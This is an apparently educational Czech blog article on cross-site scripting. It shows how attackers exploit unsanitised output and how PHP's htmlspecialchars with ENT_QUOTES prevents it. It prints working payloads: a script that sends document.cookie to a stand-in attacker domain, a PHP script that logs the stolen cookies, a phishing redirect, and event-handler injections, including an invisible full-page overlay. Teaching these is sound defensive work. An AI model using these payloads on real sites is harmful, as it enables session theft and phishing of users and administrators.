---
title: "Využití XSS díry"
headline: "Využití XSS chyby"
description: "Jak je možné využít XSS díru na webové stránce a jak XSS „opravit“."
date: "2014-06-12"
last_modification: "2014-06-17"
status: 1
tags: ["zabezpeceni"]
format: "html"
---

<p>XSS (Cross-site scripting) je metoda využívající <a href="/bezpecnost">bezpečnostní</a> chyby webu, konkrétně nedostatečné ošetření dat.</p>

<p>Typicky spočívá ve vložení škodlivého JS kódu. Útok bývá často podceňován, přestože přináší <b>obrovská risika</b>.</p>

<ol>
  <li>
    <p><b>Krádež cookie</b> – JavaScript má často přístup k datům identifikujícím přihlášeného uživatele. Obsah cookie je v <code>document.cookie</code>.</p>
       
    <p>Útočník vložením škodlivého kódu <i>pingne</i> skript na vlastním webu s předanou hodnotou cookie. Potom už stačí, aby napadenou stránku <b>navštívil administrátor</b> – jeho cookie se tak pošle útočníkovi. Zákeřnost tohoto útoku spočívá ve skutečnosti, že je velmi obtížné si napadení všimnout. Na venek se web chová normálně.</p>
    <p>Příklad JS kódu, který je potřeba dostat na server.</p>
    
    <pre><code>var ping = new Image();
ping.src = "http://domena-utocnika.cz/?" + 
            encodeURI(document.cookie);</code></pre>
    
    <p>PHP skript pro uložení obsahu:</p>
    
    <pre><code>file_put_contents(
	"cookies.txt", 
	$_SERVER["QUERY_STRING"] . "\n", 
	FILE_APPEND
);</code></pre>
    
    <p>Přístupu k obsahu cookie z JS <b>lze zabránit</b> nastavením jako <i>httponly</i> v PHP funkci <a href="http://cz2.php.net/manual/en/function.setcookie.php"><code>setcookie</code></a> nebo <a href="http://cz2.php.net/manual/en/function.session-set-cookie-params.php"><code>session_set_cookie_params</code></a>.</p>
  </li>
  
  <li>
    <p><b>Přesměrování na vlastní web</b> – v případě, že cookie k přihlášení nestačí, nebo je cílem získat hesla, dá se použít technika <i>phishingu</i>. Přesměrovat návštěvníka webu JavaScriptem na vlastní stránku s <b>přihlašovacím formulářem</b> zkopírovaným z originální stránky.</p>
    
    <pre><code>window.location = "http://domena-utocnika.cz";</code></pre>
  </li>
  
  <li>
    <p><b>Modifikace stránky</b> – jelikož JS má takřka neomezenou moc v manipulaci s webovou stránkou, může útočník využitím XSS díry za účelem výdělku přidat na děravou stránku <b>reklamu</b>, <b>affiliate odkazy</b> a podobně.</p>
  </li>
  
  <li>
    <p><b>Poškození dobrého jména</b> – vložením spojení na nějaký podezřelý web může stránce přiřknout ve vyhledávačích označení jako malware.</p>
  </li>
</ol>

<h2 id="priklad">Příklad útoku</h2>

<h3 id="html-znacky">Interpretace HTML značek</h3>

<p>V případě, že se obsah, který může ovlivnit návštěvník, vypisuje včetně HTML značek, není problém přidat kus škodlivého JavaScriptu.</p>

<pre><code>&lt;script>
alert("XSS");
&lt;/script></code></pre>

<p>Potřebujeme-li umožnit vkládat HTML značky, nezbývá než použít nějaký nástroj pro <a href="/vycisteni-kodu">pročištění kódu</a>, kde jde přímo vyjmenovat povolené HTML značky a atributy.</p>

<p>Není-li potřeba HTML značky interpretovat, postačí PHP funkce <code>htmlspecialchars</code>.</p>

<h3 id="html-atributy">Interpretace v HTML atributech</h3>

<p>Méně známý problém je obsah v <b>HTML atributech</b>. V PHP existuje funkce <code>strip_tags</code>, která slouží k odstranění všeho, co vypadá jako HTML značka (tedy i třeba smajlíka <code>&lt;3</code> nebo výrazu <code>a&lt;b</code>, což bývá nežádoucí).</p>

<p>Zásadní problém této funkce tkví v neodstraňování atributů. Použitím <code>strip_tags</code> a povolení byť jen jediné HTML značky <b>vznikne XSS díra</b>.</p>

<p>Škodlivý JavaScript je totiž možné vkládat i do různých <code>onNěco</code> událostí:</p>

<pre><code>&lt;b onmousemove='alert("XSS")'>&lt;b></code></pre>

<p>Funkce <code>strip_tags</code> nastavená na povolení tučného písma (značka <code>&lt;b></code>) tento kód nechá beze změn.</p>

<p>Jelikož <code>strip_tags</code> ponechá i <i>inline</i> styly, může útočník výše uvedený HTML kód naposicovat přes celou stránku s průhledným pozadím. A po provedení škodící akce element zrušit, aby se web nechoval podezřele.</p>

<pre><code>&lt;span 
onmousemove="alert('XSS'); this.parentNode.removeChild(this)" 
style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: transparent">
&lt;/span></code></pre>

<p><a href="http://kod.djpw.cz/gxdb">Živá ukázka</a></p>

<p>Při vypisování obsahu <b>uvnitř HTML atributů</b> je tedy nutné myslet na to, že když v kódu:</p>

<pre><code>&lt;h1 title='<b>%vypis%</b>'>Nadpis&lt;/h1></code></pre>

<p>Nahradíme <code>%vypis%</code> řetězcem <code>' onmousemove='alert("XSS")</code>, vznikne:</p>

<pre><code>&lt;h1 title='' onmousemove='alert("XSS")'>Nadpis&lt;/h1></code></pre>

<p>Což je funkční a <b>nebezpečný výsledek</b>.</p>

<h2 id="obrana">Obrana před XSS</h2>

<p>Důsledná obrana proti XSS spočívá v ošetřování všech dat, která se vypisují na stránce.</p>

<p>V PHP je k tomu možné použít funkci <code>htmlspecialchars</code>:</p>

<pre><code>$text = htmlspecialchars($text, ENT_QUOTES);</code></pre>

<p>Uvedení <code>ENT_QUOTES</code> zajistí právě ochranu v HTML atributech – tj. nenechá atribut uzavřít jednoduchou nebo dvojitou uvozovkou, což zabrání zapsání škodlivých <code>onNěco</code> atributů.</p>

<p>Výše uvedené použití funkce <code>htmlspecialchars</code> nahradí entitami všechny řídicí HTML znaky: <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, <code>&quot;</code> a <code>'</code>.</p>

<p>Ošetření výstupu je nutné použít i u všelijakých <b>administrátorských akcí</b>. Mohlo by se stát, že by útočník administrátora odkázal na URL, kde by byl kus <b>škodlivého JS kódu</b>, který by se bez ošetření po prokliknutí provedl.</p>